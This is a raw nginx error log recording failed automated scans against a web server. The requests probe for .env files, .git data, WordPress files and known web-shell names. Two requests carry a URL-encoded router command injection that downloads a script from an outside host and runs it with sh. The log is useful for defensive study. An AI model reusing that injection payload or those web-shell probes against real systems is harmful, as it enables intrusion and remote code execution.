2024/09/02 19:28:31 [error] 217#217: *3631 open() "/var/www/html/.env" failed (2: No such file or directory), client: 94.156.68.162, server: localhost-nginx-proxy-manager, request: "GET /.env HTTP/1.1", host: "161.97.134.50"
2024/09/02 19:46:32 [error] 217#217: *3636 open() "/var/www/html/cgi-bin/luci/;stok=/locale" failed (2: No such file or directory), client: 185.224.128.59, server: localhost-nginx-proxy-manager, request: "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(id%3E%60wget+-O-+http%3A%2F%2F154.216.17.171%3A88%2Ft%7Csh%3B%60) HTTP/1.1", host: "161.97.134.50:80"
2024/09/02 20:08:24 [error] 217#217: *3643 open() "/var/www/html/wordpress" failed (2: No such file or directory), client: 162.158.138.31, server: localhost-nginx-proxy-manager, request: "HEAD /wordpress HTTP/1.1", host: "spazfeed.com"
2024/09/02 20:08:24 [error] 217#217: *3643 open() "/var/www/html/wp" failed (2: No such file or directory), client: 162.158.138.31, server: localhost-nginx-proxy-manager, request: "HEAD /wp HTTP/1.1", host: "spazfeed.com"
2024/09/02 20:08:25 [error] 217#217: *3643 open() "/var/www/html/bc" failed (2: No such file or directory), client: 162.158.138.31, server: localhost-nginx-proxy-manager, request: "HEAD /bc HTTP/1.1", host: "spazfeed.com"
2024/09/02 20:08:25 [error] 217#217: *3643 open() "/var/www/html/bk" failed (2: No such file or directory), client: 162.158.138.31, server: localhost-nginx-proxy-manager, request: "HEAD /bk HTTP/1.1", host: "spazfeed.com"
2024/09/02 20:08:25 [error] 217#217: *3643 open() "/var/www/html/backup" failed (2: No such file or directory), client: 162.158.138.31, server: localhost-nginx-proxy-manager, request: "HEAD /backup HTTP/1.1", host: "spazfeed.com"
2024/09/02 20:08:26 [error] 217#217: *3643 open() "/var/www/html/old" failed (2: No such file or directory), client: 162.158.138.31, server: localhost-nginx-proxy-manager, request: "HEAD /old HTTP/1.1", host: "spazfeed.com"
2024/09/02 20:08:26 [error] 217#217: *3643 open() "/var/www/html/new" failed (2: No such file or directory), client: 162.158.138.31, server: localhost-nginx-proxy-manager, request: "HEAD /new HTTP/1.1", host: "spazfeed.com"
2024/09/02 20:08:26 [error] 217#217: *3643 open() "/var/www/html/main" failed (2: No such file or directory), client: 162.158.138.31, server: localhost-nginx-proxy-manager, request: "HEAD /main HTTP/1.1", host: "spazfeed.com"
2024/09/02 20:08:27 [error] 217#217: *3643 open() "/var/www/html/home" failed (2: No such file or directory), client: 162.158.138.31, server: localhost-nginx-proxy-manager, request: "HEAD /home HTTP/1.1", host: "spazfeed.com"
2024/09/02 20:14:17 [error] 217#217: *3648 open() "/var/www/html/cgi-bin/luci/;stok=/locale" failed (2: No such file or directory), client: 185.224.128.84, server: localhost-nginx-proxy-manager, request: "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(id%3E%60wget+-O-+http%3A%2F%2F154.216.17.171%3A88%2Ft%7Csh%3B%60) HTTP/1.1", host: "161.97.134.50:80"
2024/09/02 20:23:39 [error] 217#217: *3649 open() "/var/www/html/.git/HEAD" failed (2: No such file or directory), client: 162.158.87.98, server: localhost-nginx-proxy-manager, request: "GET /.git/HEAD HTTP/1.1", host: "spazfeed.com"
2024/09/02 20:28:18 [error] 217#217: *3651 open() "/var/www/html/wp-includes/js/tinymce/wp-tinymce.php" failed (2: No such file or directory), client: 162.158.148.176, server: localhost-nginx-proxy-manager, request: "GET /wp-includes/js/tinymce/wp-tinymce.php HTTP/1.1", host: "spazfeed.com"
2024/09/02 20:28:18 [error] 217#217: *3652 open() "/var/www/html/wp-tinymce.php" failed (2: No such file or directory), client: 162.158.148.155, server: localhost-nginx-proxy-manager, request: "GET /wp-tinymce.php HTTP/1.1", host: "spazfeed.com"
2024/09/02 20:28:19 [error] 217#217: *3654 open() "/var/www/html/mar.php" failed (2: No such file or directory), client: 162.158.129.128, server: localhost-nginx-proxy-manager, request: "GET /mar.php HTTP/1.1", host: "spazfeed.com"
2024/09/02 20:28:19 [error] 217#217: *3655 open() "/var/www/html/mah.php" failed (2: No such file or directory), client: 172.70.247.138, server: localhost-nginx-proxy-manager, request: "GET /mah.php HTTP/1.1", host: "spazfeed.com"
2024/09/02 20:28:19 [error] 217#217: *3652 open() "/var/www/html/admin.php" failed (2: No such file or directory), client: 162.158.148.155, server: localhost-nginx-proxy-manager, request: "GET /admin.php HTTP/1.1", host: "spazfeed.com"
2024/09/02 20:28:19 [error] 217#217: *3652 open() "/var/www/html/about.php" failed (2: No such file or directory), client: 162.158.148.155, server: localhost-nginx-proxy-manager, request: "GET /about.php HTTP/1.1", host: "spazfeed.com"
2024/09/02 20:28:19 [error] 217#217: *3656 open() "/var/www/html/db.php" failed (2: No such file or directory), client: 172.69.225.216, server: localhost-nginx-proxy-manager, request: "GET /db.php?u HTTP/1.1", host: "spazfeed.com"
2024/09/02 20:28:19 [error] 217#217: *3654 open() "/var/www/html/crop.php" failed (2: No such file or directory), client: 162.158.129.128, server: localhost-nginx-proxy-manager, request: "GET /crop.php HTTP/1.1", host: "spazfeed.com"
2024/09/02 20:28:19 [error] 217#217: *3657 open() "/var/www/html/dropdown.php" failed (2: No such file or directory), client: 162.158.129.162, server: localhost-nginx-proxy-manager, request: "GET /dropdown.php HTTP/1.1", host: "spazfeed.com"
2024/09/02 20:28:20 [error] 217#217: *3658 open() "/var/www/html/randkeyword.php" failed (2: No such file or directory), client: 172.69.225.239, server: localhost-nginx-proxy-manager, request: "GET /randkeyword.php HTTP/1.1", host: "spazfeed.com"
2024/09/02 20:28:20 [error] 217#217: *3652 open() "/var/www/html/upload.php" failed (2: No such file or directory), client: 162.158.148.155, server: localhost-nginx-proxy-manager, request: "GET /upload.php HTTP/1.1", host: "spazfeed.com"
2024/09/02 20:28:20 [error] 217#217: *3656 open() "/var/www/html/about.php" failed (2: No such file or directory), client: 172.69.225.216, server: localhost-nginx-proxy-manager, request: "GET /about.php?p= HTTP/1.1", host: "spazfeed.com"
2024/09/02 20:28:20 [error] 217#217: *3659 open() "/var/www/html/index.php" failed (2: No such file or directory), client: 162.158.129.196, server: localhost-nginx-proxy-manager, request: "GET /index.php HTTP/1.1", host: "spazfeed.com"
2024/09/02 20:28:20 [error] 217#217: *3656 open() "/var/www/html/autoload_classmap.php" failed (2: No such file or directory), client: 172.69.225.216, server: localhost-nginx-proxy-manager, request: "GET /autoload_classmap.php HTTP/1.1", host: "spazfeed.com"
2024/09/02 20:28:20 [error] 217#217: *3660 open() "/var/www/html/randkeyword.PhP7" failed (2: No such file or directory), client: 172.70.247.102, server: localhost-nginx-proxy-manager, request: "GET /randkeyword.PhP7 HTTP/1.1", host: "spazfeed.com"
2024/09/02 20:28:20 [error] 217#217: *3655 open() "/var/www/html/404.php" failed (2: No such file or directory), client: 172.70.247.138, server: localhost-nginx-proxy-manager, request: "GET /404.php HTTP/1.1", host: "spazfeed.com"
2024/09/02 20:28:20 [error] 217#217: *3652 open() "/var/www/html/content.php" failed (2: No such file or directory), client: 162.158.148.155, server: localhost-nginx-proxy-manager, request: "GET /content.php HTTP/1.1", host: "spazfeed.com"
2024/09/02 20:28:20 [error] 217#217: *3658 open() "/var/www/html/worksec.php" failed (2: No such file or directory), client: 172.69.225.239, server: localhost-nginx-proxy-manager, request: "GET /worksec.php HTTP/1.1", host: "spazfeed.com"
2024/09/02 20:28:20 [error] 217#217: *3661 open() "/var/www/html/.well-known/pki-validation/index.php" failed (2: No such file or directory), client: 188.114.102.197, server: localhost-nginx-proxy-manager, request: "GET /.well-known/pki-validation/index.php HTTP/1.1", host: "spazfeed.com"
2024/09/02 20:28:20 [error] 217#217: *3662 open() "/var/www/html/xmrlpc.php" failed (2: No such file or directory), client: 172.70.247.125, server: localhost-nginx-proxy-manager, request: "GET /xmrlpc.php?p= HTTP/1.1", host: "spazfeed.com"
2024/09/02 20:28:21 [error] 217#217: *3651 open() "/var/www/html/up.php" failed (2: No such file or directory), client: 162.158.148.176, server: localhost-nginx-proxy-manager, request: "GET /up.php HTTP/1.1", host: "spazfeed.com"
2024/09/02 20:28:21 [error] 217#217: *3657 open() "/var/www/html/wp-admin/images/index.php" failed (2: No such file or directory), client: 162.158.129.162, server: localhost-nginx-proxy-manager, request: "GET /wp-admin/images/index.php HTTP/1.1", host: "spazfeed.com"
2024/09/02 20:28:21 [error] 217#217: *3663 open() "/var/www/html/wp-admin/js/index.php" failed (2: No such file or directory), client: 172.70.247.121, server: localhost-nginx-proxy-manager, request: "GET /wp-admin/js/index.php HTTP/1.1", host: "spazfeed.com"
2024/09/02 20:28:21 [error] 217#217: *3656 open() "/var/www/html/wp-blogz.php" failed (2: No such file or directory), client: 172.69.225.216, server: localhost-nginx-proxy-manager, request: "GET /wp-blogz.php HTTP/1.1", host: "spazfeed.com"
2024/09/02 20:28:21 [error] 217#217: *3664 open() "/var/www/html/cong.php" failed (2: No such file or directory), client: 162.158.129.107, server: localhost-nginx-proxy-manager, request: "GET /cong.php HTTP/1.1", host: "spazfeed.com"
2024/09/02 20:28:21 [error] 217#217: *3665 open() "/var/www/html/about/function.php" failed (2: No such file or directory), client: 162.158.129.222, server: localhost-nginx-proxy-manager, request: "GET /about/function.php HTTP/1.1", host: "spazfeed.com"
2024/09/02 20:28:21 [error] 217#217: *3666 open() "/var/www/html/wp-content/uploads/2023/05/404.php" failed (2: No such file or directory), client: 188.114.102.60, server: localhost-nginx-proxy-manager, request: "GET /wp-content/uploads/2023/05/404.php HTTP/1.1", host: "spazfeed.com"
2024/09/02 20:28:21 [error] 217#217: *3652 open() "/var/www/html/wp-content/themes/pridmag/db.php" failed (2: No such file or directory), client: 162.158.148.155, server: localhost-nginx-proxy-manager, request: "GET /wp-content/themes/pridmag/db.php?u HTTP/1.1", host: "spazfeed.com"
2024/09/02 20:28:22 [error] 217#217: *3656 open() "/data/letsencrypt-acme-challenge/.well-known/acme-challenge/upfile.php" failed (2: No such file or directory), client: 172.69.225.216, server: localhost-nginx-proxy-manager, request: "GET /.well-known/acme-challenge/upfile.php HTTP/1.1", host: "spazfeed.com"
2024/09/02 20:28:22 [error] 217#217: *3658 open() "/var/www/html/wp-admin/maint/index.php" failed (2: No such file or directory), client: 172.69.225.239, server: localhost-nginx-proxy-manager, request: "GET /wp-admin/maint/index.php HTTP/1.1", host: "spazfeed.com"
2024/09/02 20:28:22 [error] 217#217: *3652 open() "/var/www/html/wp-login.php" failed (2: No such file or directory), client: 162.158.148.155, server: localhost-nginx-proxy-manager, request: "GET /wp-login.php HTTP/1.1", host: "spazfeed.com"
2024/09/02 20:28:22 [error] 217#217: *3651 open() "/var/www/html/bs1.php" failed (2: No such file or directory), client: 162.158.148.176, server: localhost-nginx-proxy-manager, request: "GET /bs1.php HTTP/1.1", host: "spazfeed.com"
2024/09/02 20:28:22 [error] 217#217: *3667 open() "/var/www/html/atomlib.php" failed (2: No such file or directory), client: 172.70.247.114, server: localhost-nginx-proxy-manager, request: "GET /atomlib.php HTTP/1.1", host: "spazfeed.com"
2024/09/02 20:28:22 [error] 217#217: *3656 open() "/var/www/html/ioxi002.PhP7" failed (2: No such file or directory), client: 172.69.225.216, server: localhost-nginx-proxy-manager, request: "GET /ioxi002.PhP7 HTTP/1.1", host: "spazfeed.com"
2024/09/02 20:28:22 [error] 217#217: *3668 open() "/var/www/html/classwithtostring.php" failed (2: No such file or directory), client: 172.69.150.165, server: localhost-nginx-proxy-manager, request: "GET /classwithtostring.php HTTP/1.1", host: "spazfeed.com"
2024/09/02 20:28:22 [error] 217#217: *3651 open() "/var/www/html/alfa-rex.php7" failed (2: No such file or directory), client: 162.158.148.176, server: localhost-nginx-proxy-manager, request: "GET /alfa-rex.php7 HTTP/1.1", host: "spazfeed.com"
2024/09/02 20:28:22 [error] 217#217: *3666 open() "/var/www/html/tiny.php" failed (2: No such file or directory), client: 188.114.102.60, server: localhost-nginx-proxy-manager, request: "GET /tiny.php HTTP/1.1", host: "spazfeed.com"
2024/09/02 20:28:22 [error] 217#217: *3669 open() "/var/www/html/wp-includes/css/index.php" failed (2: No such file or directory), client: 162.158.130.26, server: localhost-nginx-proxy-manager, request: "GET /wp-includes/css/index.php HTTP/1.1", host: "spazfeed.com"
2024/09/02 20:28:22 [error] 217#217: *3652 open() "/var/www/html/radio.php" failed (2: No such file or directory), client: 162.158.148.155, server: localhost-nginx-proxy-manager, request: "GET /radio.php HTTP/1.1", host: "spazfeed.com"
2024/09/02 20:28:23 [error] 217#217: *3670 open() "/var/www/html/fm.php" failed (2: No such file or directory), client: 162.158.129.185, server: localhost-nginx-proxy-manager, request: "GET /fm.php HTTP/1.1", host: "spazfeed.com"
2024/09/02 20:28:23 [error] 217#217: *3671 open() "/var/www/html/wp-content/index.php" failed (2: No such file or directory), client: 188.114.102.103, server: localhost-nginx-proxy-manager, request: "GET /wp-content/index.php HTTP/1.1", host: "spazfeed.com"
2024/09/02 20:28:23 [error] 217#217: *3670 open() "/var/www/html/cloud.php" failed (2: No such file or directory), client: 162.158.129.185, server: localhost-nginx-proxy-manager, request: "GET /cloud.php HTTP/1.1", host: "spazfeed.com"
2024/09/02 20:28:23 [error] 217#217: *3652 open() "/var/www/html/contact.php" failed (2: No such file or directory), client: 162.158.148.155, server: localhost-nginx-proxy-manager, request: "GET /contact.php HTTP/1.1", host: "spazfeed.com"
2024/09/02 20:28:23 [error] 217#217: *3658 open() "/data/letsencrypt-acme-challenge/.well-known/acme-challenge/license.php" failed (2: No such file or directory), client: 172.69.225.239, server: localhost-nginx-proxy-manager, request: "GET /.well-known/acme-challenge/license.php HTTP/1.1", host: "spazfeed.com"
2024/09/02 20:28:23 [error] 217#217: *3672 open() "/var/www/html/test.php" failed (2: No such file or directory), client: 172.69.151.60, server: localhost-nginx-proxy-manager, request: "GET /test.php HTTP/1.1", host: "spazfeed.com"
2024/09/02 20:28:23 [error] 217#217: *3665 open() "/var/www/html/wp-atom.php" failed (2: No such file or directory), client: 162.158.129.222, server: localhost-nginx-proxy-manager, request: "GET /wp-atom.php HTTP/1.1", host: "spazfeed.com"
2024/09/02 20:28:23 [error] 217#217: *3673 open() "/var/www/html/chosen.php" failed (2: No such file or directory), client: 162.158.130.63, server: localhost-nginx-proxy-manager, request: "GET /chosen.php HTTP/1.1", host: "spazfeed.com"
2024/09/02 20:28:24 [error] 217#217: *3674 open() "/var/www/html/wp-includes/Text/7ayddz.php" failed (2: No such file or directory), client: 172.69.151.132, server: localhost-nginx-proxy-manager, request: "GET /wp-includes/Text/7ayddz.php HTTP/1.1", host: "spazfeed.com"
2024/09/02 20:28:24 [error] 217#217: *3675 open() "/var/www/html/pwnd.php" failed (2: No such file or directory), client: 188.114.102.136, server: localhost-nginx-proxy-manager, request: "GET /pwnd.php HTTP/1.1", host: "spazfeed.com"
2024/09/02 20:28:24 [error] 217#217: *3658 open() "/var/www/html/alfanew.php7" failed (2: No such file or directory), client: 172.69.225.239, server: localhost-nginx-proxy-manager, request: "GET /alfanew.php7 HTTP/1.1", host: "spazfeed.com"
2024/09/02 20:28:24 [error] 217#217: *3652 open() "/var/www/html/user.php" failed (2: No such file or directory), client: 162.158.148.155, server: localhost-nginx-proxy-manager, request: "GET /user.php HTTP/1.1", host: "spazfeed.com"
2024/09/02 20:28:24 [error] 217#217: *3673 open() "/var/www/html/wp-includes/PHPMailer/about.php" failed (2: No such file or directory), client: 162.158.130.63, server: localhost-nginx-proxy-manager, request: "GET /wp-includes/PHPMailer/about.php HTTP/1.1", host: "spazfeed.com"
2024/09/02 20:28:24 [error] 217#217: *3676 open() "/var/www/html/wp-content/plugins/ern/aks.php" failed (2: No such file or directory), client: 172.69.150.236, server: localhost-nginx-proxy-manager, request: "GET /wp-content/plugins/ern/aks.php HTTP/1.1", host: "spazfeed.com"
2024/09/02 20:28:24 [error] 217#217: *3652 open() "/var/www/html/wp-auto.php" failed (2: No such file or directory), client: 162.158.148.155, server: localhost-nginx-proxy-manager, request: "GET /wp-auto.php HTTP/1.1", host: "spazfeed.com"
2024/09/02 20:28:24 [error] 217#217: *3677 open() "/var/www/html/wp-admin/images/wp-signup.php" failed (2: No such file or directory), client: 172.69.150.83, server: localhost-nginx-proxy-manager, request: "GET /wp-admin/images/wp-signup.php HTTP/1.1", host: "spazfeed.com"
2024/09/02 20:28:24 [error] 217#217: *3652 open() "/var/www/html/pdo.inc.php" failed (2: No such file or directory), client: 162.158.148.155, server: localhost-nginx-proxy-manager, request: "GET /pdo.inc.php HTTP/1.1", host: "spazfeed.com"
2024/09/02 20:28:24 [error] 217#217: *3652 open() "/var/www/html/info.php" failed (2: No such file or directory), client: 162.158.148.155, server: localhost-nginx-proxy-manager, request: "GET /info.php HTTP/1.1", host: "spazfeed.com"
2024/09/02 20:28:25 [error] 217#217: *3651 open() "/var/www/html/admin/upload/css.php" failed (2: No such file or directory), client: 162.158.148.176, server: localhost-nginx-proxy-manager, request: "GET /admin/upload/css.php HTTP/1.1", host: "spazfeed.com"
2024/09/02 20:28:25 [error] 217#217: *3658 open() "/var/www/html/wp-blog-header.php" failed (2: No such file or directory), client: 172.69.225.239, server: localhost-nginx-proxy-manager, request: "GET /wp-blog-header.php HTTP/1.1", host: "spazfeed.com"
2024/09/02 20:28:25 [error] 217#217: *3654 open() "/var/www/html/class-wp-widget-recent.php" failed (2: No such file or directory), client: 162.158.129.128, server: localhost-nginx-proxy-manager, request: "GET /class-wp-widget-recent.php HTTP/1.1", host: "spazfeed.com"
2024/09/02 20:28:25 [error] 217#217: *3664 open() "/var/www/html/.well-known/pki-validation/smmm.php" failed (2: No such file or directory), client: 162.158.129.107, server: localhost-nginx-proxy-manager, request: "GET /.well-known/pki-validation/smmm.php HTTP/1.1", host: "spazfeed.com"
2024/09/02 20:28:25 [error] 217#217: *3657 open() "/var/www/html/db-update.php" failed (2: No such file or directory), client: 162.158.129.162, server: localhost-nginx-proxy-manager, request: "GET /db-update.php HTTP/1.1", host: "spazfeed.com"
2024/09/02 20:28:25 [error] 217#217: *3651 open() "/var/www/html/mail.php" failed (2: No such file or directory), client: 162.158.148.176, server: localhost-nginx-proxy-manager, request: "GET /mail.php HTTP/1.1", host: "spazfeed.com"
2024/09/02 20:28:25 [error] 217#217: *3666 open() "/var/www/html/files/index.php" failed (2: No such file or directory), client: 188.114.102.60, server: localhost-nginx-proxy-manager, request: "GET /files/index.php HTTP/1.1", host: "spazfeed.com"
2024/09/02 20:28:25 [error] 217#217: *3670 open() "/var/www/html/wp-content/plugins/ioptimization/IOptimize.php" failed (2: No such file or directory), client: 162.158.129.185, server: localhost-nginx-proxy-manager, request: "GET /wp-content/plugins/ioptimization/IOptimize.php?rchk HTTP/1.1", host: "spazfeed.com"
2024/09/02 20:28:25 [error] 217#217: *3652 open() "/var/www/html/wp-content/content.php" failed (2: No such file or directory), client: 162.158.148.155, server: localhost-nginx-proxy-manager, request: "GET /wp-content/content.php HTTP/1.1", host: "spazfeed.com"
2024/09/02 20:28:25 [error] 217#217: *3669 open() "/var/www/html/wp-includes/Text/Diff/Engine.php" failed (2: No such file or directory), client: 162.158.130.26, server: localhost-nginx-proxy-manager, request: "GET /wp-includes/Text/Diff/Engine.php HTTP/1.1", host: "spazfeed.com"
2024/09/02 20:28:25 [error] 217#217: *3658 open() "/var/www/html/.well-known/pki-validation/file.php" failed (2: No such file or directory), client: 172.69.225.239, server: localhost-nginx-proxy-manager, request: "GET /.well-known/pki-validation/file.php HTTP/1.1", host: "spazfeed.com"
2024/09/02 20:28:26 [error] 217#217: *3650 open() "/var/www/html/wp-content/plugins/revslider/includes/external/page/index.php" failed (2: No such file or directory), client: 172.69.151.125, server: localhost-nginx-proxy-manager, request: "GET /wp-content/plugins/revslider/includes/external/page/index.php HTTP/1.1", host: "spazfeed.com"
2024/09/02 20:28:26 [error] 217#217: *3677 open() "/var/www/html/.well-known/pki-validation/mariju.php" failed (2: No such file or directory), client: 172.69.150.83, server: localhost-nginx-proxy-manager, request: "GET /.well-known/pki-validation/mariju.php HTTP/1.1", host: "spazfeed.com"
2024/09/02 20:28:26 [error] 217#217: *3658 open() "/var/www/html/f0x.php" failed (2: No such file or directory), client: 172.69.225.239, server: localhost-nginx-proxy-manager, request: "GET /f0x.php HTTP/1.1", host: "spazfeed.com"
2024/09/02 20:28:26 [error] 217#217: *3678 open() "/var/www/html/wp-admin/css/admin.php" failed (2: No such file or directory), client: 188.114.102.82, server: localhost-nginx-proxy-manager, request: "GET /wp-admin/css/admin.php HTTP/1.1", host: "spazfeed.com"
2024/09/02 20:28:26 [error] 217#217: *3656 open() "/var/www/html/.well-known/pki-validation/plugins.php" failed (2: No such file or directory), client: 172.69.225.216, server: localhost-nginx-proxy-manager, request: "GET /.well-known/pki-validation/plugins.php HTTP/1.1", host: "spazfeed.com"
2024/09/02 20:28:26 [error] 217#217: *3665 open() "/var/www/html/wp-content/themes/twenty/twenty.php" failed (2: No such file or directory), client: 162.158.129.222, server: localhost-nginx-proxy-manager, request: "GET /wp-content/themes/twenty/twenty.php HTTP/1.1", host: "spazfeed.com"
2024/09/02 20:28:26 [error] 217#217: *3679 open() "/var/www/html/wp-includes/SimplePie/index.php" failed (2: No such file or directory), client: 172.69.150.86, server: localhost-nginx-proxy-manager, request: "GET /wp-includes/SimplePie/index.php HTTP/1.1", host: "spazfeed.com"
2024/09/02 20:28:26 [error] 217#217: *3654 open() "/data/letsencrypt-acme-challenge/.well-known/acme-challenge/doc.php" failed (2: No such file or directory), client: 162.158.129.128, server: localhost-nginx-proxy-manager, request: "GET /.well-known/acme-challenge/doc.php HTTP/1.1", host: "spazfeed.com"
2024/09/02 20:28:26 [error] 217#217: *3652 open() "/var/www/html/.well-known/index.php" failed (2: No such file or directory), client: 162.158.148.155, server: localhost-nginx-proxy-manager, request: "GET /.well-known/index.php?p= HTTP/1.1", host: "spazfeed.com"
2024/09/02 20:28:26 [error] 217#217: *3656 open() "/var/www/html/wp-content/plugins/admin.php" failed (2: No such file or directory), client: 172.69.225.216, server: localhost-nginx-proxy-manager, request: "GET /wp-content/plugins/admin.php HTTP/1.1", host: "spazfeed.com"
2024/09/02 20:28:27 [error] 217#217: *3669 open() "/var/www/html/.well-known/setting.php" failed (2: No such file or directory), client: 162.158.130.26, server: localhost-nginx-proxy-manager, request: "GET /.well-known/setting.php HTTP/1.1", host: "spazfeed.com"
2024/09/02 20:28:27 [error] 217#217: *3680 open() "/var/www/html/license.php" failed (2: No such file or directory), client: 172.70.246.42, server: localhost-nginx-proxy-manager, request: "GET /license.php HTTP/1.1", host: "spazfeed.com"
2024/09/02 20:28:27 [error] 217#217: *3656 open() "/var/www/html/shell20211028.php" failed (2: No such file or directory), client: 172.69.225.216, server: localhost-nginx-proxy-manager, request: "GET /shell20211028.php HTTP/1.1", host: "spazfeed.com"
2024/09/02 20:28:27 [error] 217#217: *3664 open() "/var/www/html/.well-known/themes.php" failed (2: No such file or directory), client: 162.158.129.107, server: localhost-nginx-proxy-manager, request: "GET /.well-known/themes.php HTTP/1.1", host: "spazfeed.com"
2024/09/02 20:28:27 [error] 217#217: *3657 open() "/var/www/html/themes.php" failed (2: No such file or directory), client: 162.158.129.162, server: localhost-nginx-proxy-manager, request: "GET /themes.php HTTP/1.1", host: "spazfeed.com"
2024/09/02 20:28:27 [error] 217#217: *3681 open() "/var/www/html/wp-admin/js/themes.php" failed (2: No such file or directory), client: 162.158.13.165, server: localhost-nginx-proxy-manager, request: "GET /wp-admin/js/themes.php HTTP/1.1", host: "spazfeed.com"
2024/09/02 20:28:27 [error] 217#217: *3654 open() "/var/www/html/ynz.PhP7" failed (2: No such file or directory), client: 162.158.129.128, server: localhost-nginx-proxy-manager, request: "GET /ynz.PhP7?erin HTTP/1.1", host: "spazfeed.com"
2024/09/02 20:28:28 [error] 217#217: *3651 open() "/var/www/html/wp-admin/includes/1975Team.php" failed (2: No such file or directory), client: 162.158.148.176, server: localhost-nginx-proxy-manager, request: "GET /wp-admin/includes/1975Team.php HTTP/1.1", host: "spazfeed.com"
2024/09/02 20:28:28 [error] 217#217: *3656 open() "/var/www/html/modules/mod_footer/tmpl/index.php" failed (2: No such file or directory), client: 172.69.225.216, server: localhost-nginx-proxy-manager, request: "GET /modules/mod_footer/tmpl/index.php HTTP/1.1", host: "spazfeed.com"
2024/09/02 20:28:28 [error] 217#217: *3652 open() "/data/letsencrypt-acme-challenge/.well-known/acme-challenge/mariju.php" failed (2: No such file or directory), client: 162.158.148.155, server: localhost-nginx-proxy-manager, request: "GET /.well-known/acme-challenge/mariju.php HTTP/1.1", host: "spazfeed.com"
2024/09/02 20:28:28 [error] 217#217: *3668 open() "/var/www/html/xmlrpc.php" failed (2: No such file or directory), client: 172.69.150.165, server: localhost-nginx-proxy-manager, request: "GET /xmlrpc.php?rsd HTTP/1.1", host: "spazfeed.com"
2024/09/02 20:28:28 [error] 217#217: *3682 open() "/data/letsencrypt-acme-challenge/.well-known/acme-challenge/index.php" failed (2: No such file or directory), client: 172.69.150.89, server: localhost-nginx-proxy-manager, request: "GET /.well-known/acme-challenge/index.php HTTP/1.1", host: "spazfeed.com"
2024/09/02 20:28:28 [error] 217#217: *3652 open() "/var/www/html/403.php" failed (2: No such file or directory), client: 162.158.148.155, server: localhost-nginx-proxy-manager, request: "GET /403.php HTTP/1.1", host: "spazfeed.com"
2024/09/02 20:28:28 [error] 217#217: *3652 open() "/var/www/html/wp-includes/images/wp-login.php" failed (2: No such file or directory), client: 162.158.148.155, server: localhost-nginx-proxy-manager, request: "GET /wp-includes/images/wp-login.php HTTP/1.1", host: "spazfeed.com"
2024/09/02 20:28:28 [error] 217#217: *3651 open() "/var/www/html/wp-content/about.php" failed (2: No such file or directory), client: 162.158.148.176, server: localhost-nginx-proxy-manager, request: "GET /wp-content/about.php HTTP/1.1", host: "spazfeed.com"
2024/09/02 20:28:28 [error] 217#217: *3659 open() "/var/www/html/shell.php" failed (2: No such file or directory), client: 162.158.129.196, server: localhost-nginx-proxy-manager, request: "GET /shell.php HTTP/1.1", host: "spazfeed.com"
2024/09/02 20:28:28 [error] 217#217: *3652 open() "/var/www/html/aks.php" failed (2: No such file or directory), client: 162.158.148.155, server: localhost-nginx-proxy-manager, request: "GET /aks.php HTTP/1.1", host: "spazfeed.com"
2024/09/02 20:28:28 [error] 217#217: *3664 open() "/var/www/html/.well-known/pki-validation/cloud.php" failed (2: No such file or directory), client: 162.158.129.107, server: localhost-nginx-proxy-manager, request: "GET /.well-known/pki-validation/cloud.php HTTP/1.1", host: "spazfeed.com"
2024/09/02 20:28:29 [error] 217#217: *3651 open() "/var/www/html/wp-includes/sodium_compat/Crypto.php" failed (2: No such file or directory), client: 162.158.148.176, server: localhost-nginx-proxy-manager, request: "GET /wp-includes/sodium_compat/Crypto.php HTTP/1.1", host: "spazfeed.com"
2024/09/02 20:28:29 [error] 217#217: *3671 open() "/var/www/html/wp-includes/css/appendurl.php" failed (2: No such file or directory), client: 188.114.102.103, server: localhost-nginx-proxy-manager, request: "GET /wp-includes/css/appendurl.php HTTP/1.1", host: "spazfeed.com"
2024/09/02 20:28:29 [error] 217#217: *3670 open() "/data/letsencrypt-acme-challenge/.well-known/acme-challenge/atomlib.php" failed (2: No such file or directory), client: 162.158.129.185, server: localhost-nginx-proxy-manager, request: "GET /.well-known/acme-challenge/atomlib.php HTTP/1.1", host: "spazfeed.com"
2024/09/02 20:28:29 [error] 217#217: *3683 open() "/var/www/html/mar.php" failed (2: No such file or directory), client: 172.69.150.6, server: localhost-nginx-proxy-manager, request: "GET /mar.php?x=zourt HTTP/1.1", host: "spazfeed.com"
2024/09/02 20:28:29 [error] 217#217: *3665 open() "/var/www/html/.well-known/pki-validation/ssl.php" failed (2: No such file or directory), client: 162.158.129.222, server: localhost-nginx-proxy-manager, request: "GET /.well-known/pki-validation/ssl.php?xsec=blocker HTTP/1.1", host: "spazfeed.com"
2024/09/02 20:28:29 [error] 217#217: *3656 open() "/var/www/html/web/function.php" failed (2: No such file or directory), client: 172.69.225.216, server: localhost-nginx-proxy-manager, request: "GET /web/function.php HTTP/1.1", host: "spazfeed.com"
2024/09/02 20:28:29 [error] 217#217: *3651 open() "/var/www/html/product.php" failed (2: No such file or directory), client: 162.158.148.176, server: localhost-nginx-proxy-manager, request: "GET /product.php HTTP/1.1", host: "spazfeed.com"
2024/09/02 20:28:29 [error] 217#217: *3675 open() "/var/www/html/Engine.php" failed (2: No such file or directory), client: 188.114.102.136, server: localhost-nginx-proxy-manager, request: "GET /Engine.php HTTP/1.1", host: "spazfeed.com"
2024/09/02 20:28:29 [error] 217#217: *3668 open() "/var/www/html/a.php" failed (2: No such file or directory), client: 172.69.150.165, server: localhost-nginx-proxy-manager, request: "GET /a.php HTTP/1.1", host: "spazfeed.com"
2024/09/02 20:28:29 [error] 217#217: *3652 open() "/var/www/html/lock.php" failed (2: No such file or directory), client: 162.158.148.155, server: localhost-nginx-proxy-manager, request: "GET /lock.php HTTP/1.1", host: "spazfeed.com"
2024/09/02 20:28:30 [error] 217#217: *3684 open() "/var/www/html/wp-content/languages/index.php" failed (2: No such file or directory), client: 162.158.13.145, server: localhost-nginx-proxy-manager, request: "GET /wp-content/languages/index.php HTTP/1.1", host: "spazfeed.com"
2024/09/02 20:28:30 [error] 217#217: *3656 open() "/var/www/html/wp.php" failed (2: No such file or directory), client: 172.69.225.216, server: localhost-nginx-proxy-manager, request: "GET /wp.php HTTP/1.1", host: "spazfeed.com"
2024/09/02 20:28:30 [error] 217#217: *3685 open() "/var/www/html/wp-signup.php" failed (2: No such file or directory), client: 172.69.151.54, server: localhost-nginx-proxy-manager, request: "GET /wp-signup.php HTTP/1.1", host: "spazfeed.com"
